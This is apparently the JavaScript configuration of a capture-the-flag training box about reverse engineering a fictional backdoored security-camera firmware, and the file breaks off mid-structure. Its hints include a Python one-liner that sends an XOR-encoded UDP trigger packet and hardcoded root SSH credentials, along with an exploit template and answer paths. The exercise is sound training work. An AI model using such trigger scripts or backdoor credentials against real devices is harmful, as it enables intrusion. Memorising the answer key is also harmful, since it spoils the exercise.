/* ============================================================
   CTF ARENA — Box C8: The Rogue Firmware
   Multi-Stage Campaign | Hardware Hacking & Firmware Exploitation
   Config: firmware filesystem, web interface, backdoor trigger, flags, hints, lore
   ============================================================ */

const C8Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Rogue Firmware',
    subtitle: 'Multi-Stage Campaign — Hardware Hacking & Firmware Exploitation',
    difficulty: 'Advanced',
    accent: '#f39c12',
    storageKey: 'hexworth_ctf_c8',
    registryId: 'c8-rogue-firmware',
    trackerKey: 'ctf_c8',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer firmware attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'extraction',
            name: 'Firmware Extraction',
            icon: '\uD83D\uDCE6',
            description: 'Run binwalk against cam_sentinel_01_firmware.bin to extract the embedded Linux filesystem and enumerate key binaries.',
            requiredFlags: [],
            mitre: ['T1592.002', 'T1083'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Binary Analysis',
            icon: '\uD83D\uDD0E',
            description: 'Locate cam_control in the extracted filesystem. Run strings and identify obfuscated network-listener code within the ARM binary.',
            requiredFlags: [],
            mitre: ['T1059.006', 'T1027'],
            unlocks: ['backdoor'],
            locked: true
        },
        {
            id: 'backdoor',
            name: 'Backdoor Discovery',
            icon: '\uD83D\uDD13',
            description: 'Reverse engineer the cam_control binary in Ghidra. Identify the UDP listener, the magic byte trigger sequence, and the XOR-obfuscated activation path.',
            requiredFlags: [],
            mitre: ['T1027.001', 'T1046'],
            unlocks: ['emulation'],
            locked: true
        },
        {
            id: 'emulation',
            name: 'Firmware Emulation',
            icon: '\uD83D\uDCBB',
            description: 'Emulate the firmware with qemu-system-arm. Craft and transmit the magic UDP packet to the simulated CAM-SENTINEL-01 to trigger the backdoor.',
            requiredFlags: ['user'],
            mitre: ['T1610', 'T1095'],
            unlocks: ['exfiltration'],
            locked: true
        },
        {
            id: 'exfiltration',
            name: 'Manifest Extraction',
            icon: '\uD83D\uDCC4',
            description: 'Use the backdoor shell on the emulated camera to navigate to /var/log/ and extract the Perimeter Surveillance Manifest.',
            requiredFlags: ['root'],
            mitre: ['T1005', 'T1041'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Extract the firmware with binwalk',
                tip: 'Open the Terminal and run: binwalk -Me cam_sentinel_01_firmware.bin',
                trigger: { event: 'command', match: { cmd: 'contains:binwalk' } }
            },
            {
                title: 'Enumerate the extracted filesystem',
                tip: 'Explore _firmware_extracted/. Run strings on /usr/bin/cam_control and look for unusual ports or byte sequences.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:strings' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:find' } },
                        { event: 'command', match: { cmd: 'contains:ls' } }
                    ]
                }
            },
            {
                title: 'Identify the UDP backdoor trigger',
                tip: 'Use Ghidra on cam_control (ARM architecture). Look for the recv() call on UDP/55555 and the XOR loop that decodes the 0xDEADBEEF magic sequence.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Emulate and send the trigger packet',
                tip: 'Start qemu-system-arm with the extracted root filesystem, then use netcat or a Python script to send the 4-byte magic sequence to 10.13.37.200:55555/udp.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Retrieve the Perimeter Surveillance Manifest',
                tip: 'Once the backdoor enables SSH (root:cerberus-was-here), connect and cat /var/log/surveillance_manifest.txt to get Flag 2.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Binary reverse engineering and obfuscated backdoor discovery', skill: 'Firmware Reverse Engineering & Backdoor Identification' },
            { flagId: 'user', objective: '2.1', description: 'Given a scenario, apply cybersecurity solutions to the cloud — Embedded system firmware analysis and emulation', skill: 'Embedded Linux Firmware Analysis' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — Network-triggered backdoor exploitation', skill: 'Hardware Backdoor Activation & Data Exfiltration' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — IoT device security and firmware integrity', skill: 'Multi-Stage IoT Compromise Chain Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nMission: Analyze cam_sentinel_01_firmware.bin — CAM-SENTINEL-01 (Project Cerberus)\nFirmware image is in /home/kali/\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (session state machine)
    // 'attacker'   — default kali shell
    // 'qemu'       — inside qemu-system-arm emulation
    // 'cam-shell'  — backdoor shell on CAM-SENTINEL-01
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',
    _firmwareExtracted: false,
    _ghidraLoaded: false,
    _backdoorTriggerKnown: false,
    _qemuRunning: false,
    _backdoorActivated: false,
    _sshEnabled: false,
    _camShellActive: false,

    _switchContext(ctx, term) {
        C8Config._context = ctx;
        if (term && term.config) {
            var prompt = C8Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C8Config._context) {
            case 'qemu':     return 'kali@qemu-arm:~$ ';
            case 'cam-shell': return 'root@CAM-SENTINEL-01:~# ';
            default:         return null;  // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 150 },
        { id: 'root', points: 350 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 3600000, points: 200 },  // 60 minutes
        timeBonusThreshold: 5400  // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Run binwalk -Me cam_sentinel_01_firmware.bin to extract the embedded SquashFS filesystem. Then explore _firmware_extracted/ — look in /usr/bin/ and /etc/init.d/ for custom binaries.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Run strings /home/kali/_firmware_extracted/usr/bin/cam_control | grep -E "(port|udp|listen|socket|55[0-9]{3})" to find the backdoor port. Then use Ghidra with ARM little-endian settings to see the full code path.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The backdoor listens on UDP port 55555. It XOR-decodes the incoming payload with key 0xBEEF and checks if the result equals 0xDEAD. Send the encoded trigger: python3 -c "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); payload=bytes([0xDE^0xBE, 0xAD^0xEF, 0xBE^0xBE, 0xEF^0xEF]); s.sendto(payload, (\'10.13.37.200\', 55555))"',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'After sending the trigger packet, the backdoor enables SSH with root credentials (root:cerberus-was-here). SSH in: ssh root@10.13.37.200 — then cat /var/log/surveillance_manifest.txt to get the root flag.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Silent Sentinel" network — a grid of custom ARM-based security cameras designated CAM-SENTINEL-01 — guards the perimeter of the Outer Reach. A recent intelligence intercept revealed that a disgruntled former technician operating under the codename "Project Cerberus" embedded a covert backdoor within the camera\'s proprietary firmware. The backdoor provides a persistent exfiltration channel for classified surveillance data. Your mission, Peerless: acquire the firmware image, reverse engineer it to locate the backdoor, understand its trigger mechanism, activate it against a simulated camera environment, and extract the Perimeter Surveillance Manifest.',
        scenario: 'CAM-SENTINEL-01 runs a stripped-down ARM embedded Linux built on a custom Buildroot system. The firmware image has been pulled from a decommissioned unit and provided as cam_sentinel_01_firmware.bin. Cerberus was clever — the backdoor code is lightly obfuscated with XOR-encoded strings and is buried inside the primary camera control daemon (cam_control). The daemon appears to function normally, but a hidden code path activates when a specific magic byte sequence arrives on an undocumented UDP port. Once triggered, the backdoor quietly enables SSH with hardcoded root credentials, giving the attacker full access to the camera\'s runtime environment.',
        outro: 'The Perimeter Surveillance Manifest has been extracted. CAM-SENTINEL-01 — and every camera in the Silent Sentinel network running the same firmware — is fully compromised. Project Cerberus\'s backdoor remained undetected in production hardware for 14 months. Every compromised target logged in the manifest was unknowingly under adversarial surveillance.',
        ecer: {
            executive: 'No firmware integrity verification in the supply chain; third-party firmware builds accepted without cryptographic signing requirement',
            culture: 'Embedded systems team operated without code review for custom daemons; security audit budget excluded firmware and IoT hardware',
            employee: 'Disgruntled technician retained source code access after notice period; no separation of duties for firmware build pipeline',
            regulatory: 'No IoT device security standard enforced; firmware update mechanism lacks authentication; hardcoded credentials never audited'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — CAM-SENTINEL-01 Management Interface
    // Simulates the camera's built-in lighttpd web panel
    // (accessible once QEMU is running — 10.13.37.200:80)
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.13.37.200/',

        pages: {
            '/': {
                title: 'CAM-SENTINEL-01 — Management Interface',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #333;">
                        <h1 style="color:#f39c12; font-size:1.4rem; font-family:'Courier New',monospace; margin-bottom:4px; letter-spacing:0.05em;">CAM-SENTINEL-01</h1>
                        <div style="color:#888; font-size:0.75rem; letter-spacing:0.18em; text-transform:uppercase;">Perimeter Security Camera — Management Interface</div>
                        <div style="color:#555; font-size:0.7rem; margin-top:6px;">Firmware v2.3.1-cerberus | lighttpd/1.4.67 | ARM Embedded Linux</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <div style="background:#1a1a1a; border:1px solid #2a2a2a; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:0.65rem; color:#666; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:4px;">Status</div>
                            <div style="font-size:0.85rem; font-weight:700; color:#2ecc71; font-family:monospace;">ONLINE</div>
                        </div>
                        <div style="background:#1a1a1a; border:1px solid #2a2a2a; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:0.65rem; color:#666; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:4px;">Uptime</div>
                            <div style="font-size:0.85rem; font-weight:700; color:#f39c12; font-family:monospace;">14d 06h 33m</div>
                        </div>
                        <div style="background:#1a1a1a; border:1px solid #2a2a2a; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:0.65rem; color:#666; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:4px;">Arch</div>
                            <div style="font-size:0.85rem; font-weight:700; color:#3498db; font-family:monospace;">ARMv7</div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 16px;">
                        <div style="background:#1a1a1a; border:1px solid #2a2a2a; border-radius:6px; padding:14px;">
                            <div style="color:#888; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:10px;">System Services</div>
                            <div style="display:grid; gap:6px; font-family:monospace; font-size:0.78rem;">
                                <div style="display:flex; justify-content:space-between; color:#ccc;"><span>cam_control</span><span style="color:#2ecc71;">running</span></div>
                                <div style="display:flex; justify-content:space-between; color:#ccc;"><span>lighttpd</span><span style="color:#2ecc71;">running</span></div>
                                <div style="display:flex; justify-content:space-between; color:#ccc;"><span>dropbear (ssh)</span><span style="color:#e74c3c;">stopped</span></div>
                                <div style="display:flex; justify-content:space-between; color:#ccc;"><span>watchdog</span><span style="color:#2ecc71;">running</span></div>
                            </div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto; padding:10px 14px; background:rgba(243,156,18,0.06); border:1px solid rgba(243,156,18,0.18); border-radius:4px; font-size:0.72rem; color:#888;">
                        <strong style="color:#f39c12;">Notice:</strong> Administrative API available at <a href="/api/" style="color:#f39c12;">/api/</a>. Firmware diagnostic logs at <a href="/logs/" style="color:#f39c12;">/logs/</a>.
                    </div>
                `,
                formHandler: null
            },

            '/api/': {
                title: 'CAM-SENTINEL-01 — API Endpoint',
                html: function() {
                    if (!C8Config._qemuRunning) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:2rem;">Connection Refused</h1><p style="color:#888;">Could not connect to 10.13.37.200. Is the QEMU emulation running?</p></div>';
                    }
                    return `<div style="max-width:640px; margin:0 auto; padding:20px;">
                        <h2 style="color:#f39c12; font-family:monospace; margin-bottom:6px; font-size:1.1rem;">CAM-SENTINEL-01 REST API</h2>
                        <div style="color:#666; font-size:0.75rem; margin-bottom:20px;">Firmware v2.3.1 — lighttpd/1.4.67 JSON Interface</div>
                        <div style="background:#1a1a1a; border:1px solid #2a2a2a; border-radius:6px; padding:16px; font-family:monospace; font-size:0.78rem; color:#ccc; margin-bottom:16px;">
                            <div style="color:#f39c12; margin-bottom:10px;">GET /api/status</div>
                            <div style="color:#2ecc71;">{"device":"CAM-SENTINEL-01","fw":"2.3.1-cerberus","arch":"armv7","uptime":1238027,"cam_control":"running","ssh":"stopped"}</div>
                        </div>
                        <div style="background:#1a1a1a; border:1px solid #2a2a2a; border-radius:6px; padding:16px; font-family:monospace; font-size:0.78rem; color:#ccc; margin-bottom:16px;">
                            <div style="color:#f39c12; margin-bottom:10px;">GET /api/version</div>
                            <div style="color:#2ecc71;">{"kernel":"4.14.115-cerberus","buildroot":"2019.11.3","toolchain":"arm-buildroot-linux-gnueabihf","compiler":"gcc-8.3.0"}</div>
                        </div>
                        <div style="padding:10px 14px; background:rgba(231,76,60,0.06); border:1px solid rgba(231,76,60,0.15); border-radius:4px; font-size:0.72rem; color:#888;">
                            <strong style="color:#e74c3c;">Note:</strong> /api/admin requires authentication. /api/debug is undocumented.
                        </div>
                    </div>`;
                },
                formHandler: null
            },

            '/logs/': {
                title: 'CAM-SENTINEL-01 — System Logs',
                html: function() {
                    if (!C8Config._qemuRunning) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:2rem;">Connection Refused</h1><p style="color:#888;">Could not connect to 10.13.37.200. Is the QEMU emulation running?</p></div>';
                    }
                    return `<div style="max-width:640px; margin:0 auto; padding:20px;">
                        <h2 style="color:#f39c12; font-family:monospace; margin-bottom:16px; font-size:1.0rem;">System Log — cam_control daemon</h2>
                        <div style="background:#0d0d0d; border:1px solid #222; border-radius:6px; padding:16px; font-family:monospace; font-size:0.72rem; color:#888; line-height:1.7;">
                            <span style="color:#3498db;">[2026-03-19 03:14:02]</span> cam_control: daemon started (pid 342)<br>
                            <span style="color:#3498db;">[2026-03-19 03:14:02]</span> cam_control: binding video capture /dev/video0<br>
                            <span style="color:#3498db;">[2026-03-19 03:14:03]</span> cam_control: motion detection initialized (threshold: 12)<br>
                            <span style="color:#3498db;">[2026-03-19 03:14:03]</span> cam_control: HTTP keepalive server started :80<br>
                            <span style="color:#3498db;">[2026-03-19 03:14:04]</span> cam_control: watchdog registered (timeout: 30s)<br>
                            <span style="color:#3498db;">[2026-03-19 03:15:12]</span> cam_control: motion event logged (zone: SECTOR-7)<br>
                            <span style="color:#3498db;">[2026-03-19 03:22:44]</span> cam_control: motion event logged (zone: SECTOR-2)<br>
                            <span style="color:#3498db;">[2026-03-19 06:00:00]</span> cam_control: scheduled log rotation<br>
                            <span style="color:#3498db;">[2026-03-19 14:18:31]</span> cam_control: motion event logged (zone: SECTOR-7)<br>
                            <span style="color:#3498db;">[2026-03-20 00:00:01]</span> cam_control: heartbeat OK<br>
                        </div>
                        <div style="margin-top:12px; padding:10px 14px; background:rgba(243,156,18,0.06); border:1px solid rgba(243,156,18,0.18); border-radius:4px; font-size:0.72rem; color:#888;">
                            <strong style="color:#f39c12;">Note:</strong> /var/log/surveillance_manifest.txt is not served via this interface.
                        </div>
                    </div>`;
                },
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // Contains the firmware image and analysis workspace
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: PROJECT CERBERUS ===\nTarget: CAM-SENTINEL-01 (Outer Reach perimeter camera)\nFirmware image: /home/kali/cam_sentinel_01_firmware.bin\nObjective: Firmware analysis & backdoor exploitation\n\nAttack chain:\n1. Extract filesystem from firmware binary (binwalk)\n2. Enumerate filesystem — find key binaries in /usr/bin/\n3. Reverse engineer cam_control (ARM) — identify backdoor\n4. Emulate firmware with qemu-system-arm\n5. Craft and send magic UDP packet to trigger backdoor\n6. Gain shell — retrieve /var/log/surveillance_manifest.txt\n\nKnown intel: Backdoor installed by "Project Cerberus."\nXOR obfuscation in use. Network-triggered. ARM binary.\nGood luck, operator.'
                                },
                                'cam_sentinel_01_firmware.bin': {
                                    type: 'file',
                                    content: '[Binary firmware image — 8,388,608 bytes]\n[SHA256: a3f8c2e1d7b4906542fd8ca17e3b09f2c5a6d81e4c29b0f37a8e51d6c90427b1]\n[Run binwalk -Me cam_sentinel_01_firmware.bin to extract]\n[Hint: SquashFS filesystem detected at offset 0x120000]'
                                },
                                'exploit.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# Project Cerberus — UDP Backdoor Trigger Script\n# Fill in the TARGET_IP and PORT after reverse engineering cam_control\n\nimport socket\n\nTARGET_IP = "10.13.37.200"  # Replace with QEMU address\nTARGET_PORT = 0             # Replace with backdoor port from Ghidra\nMAGIC_RAW  = 0x00000000     # Replace with decoded magic value\nXOR_KEY    = 0x0000         # Replace with XOR key from binary\n\n# XOR-encode the magic bytes before sending\npayload = bytes([\n    (MAGIC_RAW >> 24 & 0xFF) ^ (XOR_KEY >> 8 & 0xFF),\n    (MAGIC_RAW >> 16 & 0xFF) ^ (XOR_KEY & 0xFF),\n    (MAGIC_RAW >>  8 & 0xFF) ^ (XOR_KEY >> 8 & 0xFF),\n    (MAGIC_RAW       & 0xFF) ^ (XOR_KEY & 0xFF)\n])\n\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(payload, (TARGET_IP, TARGET_PORT))\nprint(f"[+] Payload sent to {TARGET_IP}:{TARGET_PORT}")\nprint(f"[+] Encoded bytes: {payload.hex()}")\ns.close()'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'file cam_sentinel_01_firmware.bin\nbinwalk cam_sentinel_01_firmware.bin\nstrings cam_sentinel_01_firmware.bin | head -40\n'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'bin': {
                            type: 'dir',
                            children: {
                                'binwalk': {
                                    type: 'file',
                                    content: '[binwalk v2.3.4 — firmware analysis tool]'
                                },
                                'ghidra': {
                                    type: 'file',
                                    content: '[Ghidra 10.3 — NSA reverse engineering framework]'
                                },
                                'qemu-system-arm': {
                                    type: 'file',
                                    content: '[QEMU emulator for ARM targets v7.2.0]'
                                }
                            }
                        },
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — Extracted firmware (after binwalk)
    // Simulates the SquashFS root of CAM-SENTINEL-01
    // ═══════════════════════════════════════════════════════

    _extractedFs: {
        '/': {
            type: 'dir',
            children: {
                'bin': {
                    type: 'dir',
                    children: {
                        'sh': { type: 'file', content: '[ARM ELF — busybox symlink]' },
                        'busybox': { type: 'file', content: '[ARM ELF — BusyBox v1.31.1 (2020-03-05)]' },
                        'cat': { type: 'file', content: '[ARM ELF — busybox symlink]' },
                        'ls': { type: 'file', content: '[ARM ELF — busybox symlink]' }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'bin': {
                            type: 'dir',
                            children: {
                                'cam_control': {
                                    type: 'file',
                                    content: '[ARM ELF 32-bit LSB executable — 47,312 bytes]\n[SHA256: 8e4a1f7c3b2d905461fe8ca07e3a19f2c5b6d82e4c18b0f27a7e40d5c80316b0]\n[Load in Ghidra with ARM Cortex-A7 processor settings]\n[Strings of interest: "UDP_LISTEN_PORT", "MAGIC_TRIGGER", "dropbear", "/var/log/surveillance_manifest.txt"]\n[XOR-obfuscated constant detected at offset 0x00003A2C]'
                                },
                                'cam_stream': {
                                    type: 'file',
                                    content: '[ARM ELF 32-bit LSB executable — 12,480 bytes]\n[Video capture and RTSP streaming daemon]'
                                }
                            }
                        },
                        'sbin': {
                            type: 'dir',
                            children: {
                                'lighttpd': {
                                    type: 'file',
                                    content: '[ARM ELF — lighttpd/1.4.67]'
                                },
                                'dropbear': {
                                    type: 'file',
                                    content: '[ARM ELF — Dropbear SSH server v2020.81]\n[Note: disabled by default — started by cam_control backdoor routine]'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'CAM-SENTINEL-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/sh\ndaemon:x:1:1:daemon:/usr/sbin:/bin/false\ncam:x:100:100:Camera Daemon:/var/cam:/bin/sh'
                        },
                        'shadow': {
                            type: 'file',
                            content: 'root:!:18000:0:99999:7:::\ncam:!:18000:0:99999:7:::\n[Note: Root password set dynamically by backdoor — not in shadow file]'
                        },
                        'inittab': {
                            type: 'file',
                            content: '# /etc/inittab — BusyBox init configuration\n::sysinit:/etc/init.d/rcS\n::respawn:/sbin/getty -L ttyAMA0 115200 vt100\n::once:/usr/bin/cam_control &\n::ctrlaltdel:/sbin/reboot'
                        },
                        'init.d': {
                            type: 'dir',
                            children: {
                                'rcS': {
                                    type: 'file',
                                    content: '#!/bin/sh\n# System startup script\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t tmpfs tmpfs /tmp\nifconfig eth0 10.13.37.200 netmask 255.255.255.0\nroute add default gw 10.13.37.1\n/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf\n/usr/bin/cam_control &'
                                }
                            }
                        },
                        'lighttpd': {
                            type: 'dir',
                            children: {
                                'lighttpd.conf': {
                                    type: 'file',
                                    content: 'server.port = 80\nserver.document-root = "/var/www/html"\nserver.errorlog = "/var/log/lighttpd/error.log"\nindex-file.names = ("index.html")\nurl.access-deny = ("/var/log/")'
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'surveillance_manifest.txt': {
                                    type: 'file',
                                    content: '=== PERIMETER SURVEILLANCE MANIFEST ===\n=== OUTER REACH — CAM-SENTINEL-01    ===\n=== CLASSIFICATION: TOP SECRET        ===\n\nID  | TARGET                      | SECTOR   | STATUS\n----+-----------------------------+----------+--------\n001 | Director Mira Solano        | SEC-1    | ACTIVE\n002 | Dr. Pavel Renko             | SEC-2    | ACTIVE\n003 | Agent Calloway (undercover) | SEC-3    | BURNED\n004 | Junction Station OMEGA      | SEC-7    | ACTIVE\n005 | Safehouse BRAVO-9           | SEC-4    | ACTIVE\n006 | RELAY NODE 14               | SEC-5    | OFFLINE\n007 | Convoy Route DELTA          | SEC-6    | ACTIVE\n\n[CERBERUS EXFIL MARKER]\n{{FLAG:root}}'
                                },
                                'cam_control.log': {
                                    type: 'file',
                                    content: '[2026-03-19 03:14:04] cam_control: started\n[2026-03-19 03:14:04] cam_control: UDP listener initialized port 55555\n[2026-03-19 03:14:04] cam_control: watchdog armed\n[2026-03-19 14:18:31] cam_control: motion zone SECTOR-7'
                                }
                            }
                        },
                        'www': {
                            type: 'dir',
                            children: {
                                'html': {
                                    type: 'dir',
                                    children: {
                                        'index.html': {
                                            type: 'file',
                                            content: '<!DOCTYPE html>\n<html>\n<head><title>CAM-SENTINEL-01</title></head>\n<body>\n<h1>CAM-SENTINEL-01 — Management Interface</h1>\n<p>Firmware v2.3.1-cerberus | ARMv7 Embedded Linux</p>\n</body>\n</html>'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'lib': {
                    type: 'dir',
                    children: {
                        'libc.so.6': { type: 'file', content: '[ARM shared library — GNU C Library v2.29]' },
                        'libm.so.6': { type: 'file', content: '[ARM shared library — math library]' },
                        'libpthread.so.0': { type: 'file', content: '[ARM shared library — POSIX threads]' }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {}
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED CAMERA FILESYSTEM (live QEMU context)
    // After backdoor activation + SSH login as root
    // ═══════════════════════════════════════════════════════

    _camFs: {
        '/': {
            type: 'dir',
            children: {
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'surveillance_manifest.txt': {
                                    type: 'file',
                                    content: '=== PERIMETER SURVEILLANCE MANIFEST ===\n=== OUTER REACH — CAM-SENTINEL-01    ===\n=== CLASSIFICATION: TOP SECRET        ===\n\nID  | TARGET                      | SECTOR   | STATUS\n----+-----------------------------+----------+--------\n001 | Director Mira Solano        | SEC-1    | ACTIVE\n002 | Dr. Pavel Renko             | SEC-2    | ACTIVE\n003 | Agent Calloway (undercover) | SEC-3    | BURNED\n004 | Junction Station OMEGA      | SEC-7    | ACTIVE\n005 | Safehouse BRAVO-9           | SEC-4    | ACTIVE\n006 | RELAY NODE 14               | SEC-5    | OFFLINE\n007 | Convoy Route DELTA          | SEC-6    | ACTIVE\n\n[CERBERUS EXFIL MARKER]\n{{FLAG:root}}'
                                },
                                'cam_control.log': {
                                    type: 'file',
                                    content: '[2026-03-19 03:14:04] cam_control: started\n[2026-03-19 03:14:04] cam_control: UDP listener initialized port 55555\n[2026-03-19 03:22:14] cam_control: TRIGGER RECEIVED — magic bytes validated\n[2026-03-19 03:22:14] cam_control: BACKDOOR ACTIVATED — enabling dropbear SSH'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'CAM-SENTINEL-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/sh\ncam:x:100:100:Camera Daemon:/var/cam:/bin/sh'
                        },
                        'shadow': {
                            type: 'file',
                            content: 'root:$6$cerberus$hash_of_cerberus-was-here:18000:0:99999:7:::\ncam:!:18000:0:99999:7:::'
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        'version': {
                            type: 'file',
                            content: 'Linux version 4.14.115-cerberus (cerberus@build-server) (gcc version 8.3.0 (Buildroot 2019.11.3)) #1 PREEMPT'
                        },
                        'cpuinfo': {
                            type: 'file',
                            content: 'processor\t: 0\nmodel name\t: ARMv7 Processor rev 4 (v7l)\nBogoMIPS\t: 2.00\nFeatures\t: half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae\nCPU implementer\t: 0x41\nCPU architecture: 7\nCPU variant\t: 0x0\nCPU part\t: 0xc07\nCPU revision\t: 4\nHardware\t: CERBERUS-CAM-V1'
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'bin': {
                            type: 'dir',
                            children: {
